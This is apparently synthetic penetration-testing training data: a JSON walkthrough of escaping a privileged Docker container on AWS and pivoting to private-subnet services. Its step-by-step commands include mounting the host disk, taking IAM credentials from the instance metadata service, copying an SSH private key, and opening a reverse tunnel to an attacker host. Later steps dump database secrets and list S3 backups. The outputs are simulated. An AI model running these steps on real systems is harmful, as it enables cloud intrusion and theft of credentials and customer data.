@@ -1,0 +1,100 @@
+{
+  "title": "Episode 3: Cloud VPC Pivoting and Container Escape",
+  "scenario": "Cloud penetration test against AWS-hosted SaaS platform. Initial access gained to public-facing web application container (172.31.10.50) running in public subnet of VPC. Discovered container has privileged Docker access and can see host network. Internal services run in private subnet (10.0.20.0/24) with no direct internet access. Objective: Escape container, pivot to underlying EC2 host, establish tunnel to private subnet, and compromise internal microservices and RDS database.",
+  "steps": [
+    {
+      "step": 1,
+      "description": "Identify container environment and check privileges",
+      "command": "cat /.dockerenv && cat /proc/1/cgroup | grep docker\ncapsh --print",
+      "output": "/.dockerenv exists\n12:perf_event:/docker/a1b2c3d4e5f6\n\nCurrent: = cap_sys_admin,cap_net_admin,cap_dac_override+eip\n\nPrivileged container detected!\ncap_sys_admin = can mount host filesystem",
+      "explanation": "Container is running privileged with dangerous capabilities - can escape to host"
+    },
+    {
+      "step": 2,
+      "description": "Escape container by mounting host filesystem",
+      "command": "fdisk -l\nmkdir /tmp/host\nmount /dev/xvda1 /tmp/host\nls /tmp/host",
+      "output": "Disk /dev/xvda1: 100 GiB (AWS EBS volume)\n\nbin  boot  dev  etc  home  root  var  usr\n\nHost filesystem mounted at /tmp/host\nFull access to EC2 instance filesystem!",
+      "explanation": "Mounted host EBS volume inside container, effectively escaping to EC2 host"
+    },
+    {
+      "step": 3,
+      "description": "Extract AWS credentials from host EC2 metadata",
+      "command": "chroot /tmp/host /bin/bash\ncurl http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+      "output": "web-app-role\n\ncurl http://169.254.169.254/latest/meta-data/iam/security-credentials/web-app-role\n{\n  \"AccessKeyId\": \"ASIATESTACCESSKEY123\",\n  \"SecretAccessKey\": \"wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY\",\n  \"Token\": \"IQoJb3JpZ2luX2VjEH...\",\n  \"Expiration\": \"2024-01-15T22:30:00Z\"\n}\n\nIAM role credentials extracted!",
+      "explanation": "Retrieved temporary AWS credentials from instance metadata service"
+    },
+    {
+      "step": 4,
+      "description": "Enumerate AWS environment and network topology",
+      "command": "export AWS_ACCESS_KEY_ID=ASIATESTACCESSKEY123\nexport AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY\nexport AWS_SESSION_TOKEN=IQoJb3JpZ2luX2VjEH...\n\naws ec2 describe-instances --region us-east-1",
+      "output": "Instance i-0a1b2c3d4e5f (current host):\n  Public IP: 54.123.45.67\n  Private IP: 172.31.10.50\n  Subnet: subnet-public-1 (172.31.10.0/24)\n  Security Group: sg-web-dmz\n\nInstance i-9z8y7x6w5v4:\n  Private IP: 10.0.20.10\n  Subnet: subnet-private-1 (10.0.20.0/24)\n  Tags: Name=api-server-1\n\nInstance i-8a7b6c5d4e3:\n  Private IP: 10.0.20.20  \n  Tags: Name=api-server-2\n\nPrivate subnet hosts discovered: 10.0.20.0/24",
+      "explanation": "Enumerated VPC topology using stolen IAM credentials - found private subnet instances"
+    },
+    {
+      "step": 5,
+      "description": "Check host network interfaces and routing",
+      "command": "ip addr show\nip route show",
+      "output": "eth0: 172.31.10.50/24 (public subnet)\neth1: 10.0.20.5/24 (private subnet interface)\n\nRoutes:\n172.31.10.0/24 dev eth0\n10.0.20.0/24 dev eth1\ndefault via 172.31.10.1 dev eth0\n\nEC2 host is dual-homed! Can reach private subnet directly",
+      "explanation": "Host has network interface in both public and private subnets - perfect pivot point"
+    },
+    {
+      "step": 6,
+      "description": "Setup reverse SSH tunnel from compromised EC2 host",
+      "command": "cat /tmp/host/home/ubuntu/.ssh/id_rsa > /tmp/ec2_key\nchmod 600 /tmp/ec2_key\nssh -i /tmp/ec2_key -R 9999:10.0.20.10:22 -R 1080:127.0.0.1:1080 attacker@54.200.100.50 -N -f",
+      "output": "Reverse SSH tunnel established to attacker VPS:\n  Port 9999: Forward to private API server (10.0.20.10:22)\n  Port 1080: SOCKS proxy for full private subnet access\n\nPrivate subnet now accessible from attacker!",
+      "explanation": "Created reverse SSH tunnel back to attacker's VPS to bypass AWS security groups"
+    },
+    {
+      "step": 7,
+      "description": "Scan private subnet through reverse tunnel",
+      "command": "[On attacker VPS 54.200.100.50]:\nproxychains -f socks.conf nmap -sT -Pn 10.0.20.0/24 -p 22,80,443,3306,5432,6379,8080\n\n[socks.conf]:\nsocks5 127.0.0.1 1080",
+      "output": "10.0.20.10 - SSH (22), HTTP (8080) - api-server-1\n10.0.20.20 - SSH (22), HTTP (8080) - api-server-2  \n10.0.20.30 - Redis (6379) - cache-server\n10.0.20.100 - PostgreSQL (5432) - RDS endpoint\n\n4 internal services discovered",
+      "explanation": "Scanned private subnet through reverse SOCKS tunnel"
+    },
+    {
+      "step": 8,
+      "description": "Access API server via reverse port forward",
+      "command": "ssh -i ec2_key -p 9999 ubuntu@127.0.0.1",
+      "output": "ubuntu@ip-10-0-20-10:~$ hostname\napi-server-1\n\nubuntu@ip-10-0-20-10:~$ ip addr show eth0\neth0: 10.0.20.10/24\n\nubuntu@ip-10-0-20-10:~$ docker ps\nCONTAINER ID   IMAGE              PORTS\na1b2c3d4e5f6   api-service:v2.1   8080/tcp\n\nAccess to private API server via reverse tunnel!",
+      "explanation": "SSH'd to private subnet API server through reverse port forward"
+    },
+    {
+      "step": 9,
+      "description": "Extract application secrets and database credentials",
+      "command": "docker exec a1b2c3d4e5f6 env | grep -E 'DB|SECRET|KEY|PASSWORD'",
+      "output": "DB_HOST=10.0.20.100\nDB_NAME=production_db\nDB_USER=api_service\nDB_PASSWORD=Pr0dDB_P@ssw0rd!2024\nJWT_SECRET=super_secret_jwt_key_12345\nAWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE\nAWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYZEXAMPLEKEY\n\nDatabase credentials and secrets extracted!",
+      "explanation": "Extracted RDS credentials and AWS keys from API container environment variables"
+    },
+    {
+      "step": 10,
+      "description": "Setup SSHuttle VPN to private subnet",
+      "command": "[On attacker machine]:\nsshuttle -r ubuntu@54.200.100.50 10.0.20.0/24 -e 'ssh -p 9999' --dns",
+      "output": "c : Connected to server.\nfw: Starting firewall.\nfw: iptables -t nat -A sshuttle -d 10.0.20.0/24 -j REDIRECT --to-ports 12300\n\nVPN to private subnet active!\nDirect access: ping 10.0.20.10 ✓\n              curl http://10.0.20.30:6379 ✓",
+      "explanation": "Established transparent VPN to AWS private subnet - no proxy needed for tools"
+    },
+    {
+      "step": 11,
+      "description": "Access RDS database directly through VPN",
+      "command": "psql -h 10.0.20.100 -U api_service -d production_db -W",
+      "output": "Password for user api_service: Pr0dDB_P@ssw0rd!2024\n\nproduction_db=> \\dt\n              List of relations\n Schema |     Name      | Type  |    Owner    \n--------+---------------+-------+-------------\n public | users         | table | api_service\n public | payments      | table | api_service\n public | transactions  | table | api_service\n public | api_keys      | table | api_service\n\nproduction_db=> SELECT COUNT(*) FROM users;\n count  \n--------\n 845623\n\nproduction_db=> SELECT COUNT(*) FROM payments;\n count \n-------\n 234567\n\nFull access to production RDS database!",
+      "explanation": "Connected directly to private RDS instance through VPN tunnel"
+    },
+    {
+      "step": 12,
+      "description": "Enumerate S3 buckets with extracted AWS credentials",
+      "command": "export AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE\nexport AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYZEXAMPLEKEY\n\naws s3 ls\naws s3 ls s3://prod-app-backups/",
+      "output": "2024-01-10 prod-app-backups\n2024-01-12 prod-customer-data\n2024-01-14 prod-application-logs\n\nContents of s3://prod-app-backups/:\n2024-01-15 database-backup-20240115.sql.gz\n2024-01-14 database-backup-20240114.sql.gz\n2024-01-13 application-config.tar.gz\n\nSensitive S3 buckets accessible:\n  - Database backups\n  - Customer data exports\n  - Application configurations",
+      "explanation": "Used extracted AWS credentials to access S3 buckets with sensitive data"
+    }
+  ],
+  "outcome": "Successfully pivoted from containerized web application to full AWS infrastructure compromise. Escaped privileged Docker container to EC2 host, established reverse tunnels bypassing AWS security groups, gained access to private subnet services, compromised RDS production database with 845K users and 234K payment records, and accessed sensitive S3 buckets. Demonstrated that container misconfigurations can lead to complete cloud environment compromise.",
+  "learning_objectives": [
+    "Identify and exploit privileged Docker containers",
+    "Escape containers by mounting host filesystems",
+    "Extract AWS credentials from EC2 instance metadata",
+    "Pivot between AWS VPC subnets using dual-homed instances",
+    "Bypass AWS security groups with reverse SSH tunnels",
+    "Establish VPN access to private cloud networks",
+    "Enumerate cloud resources with compromised IAM credentials"
+  ]
+}
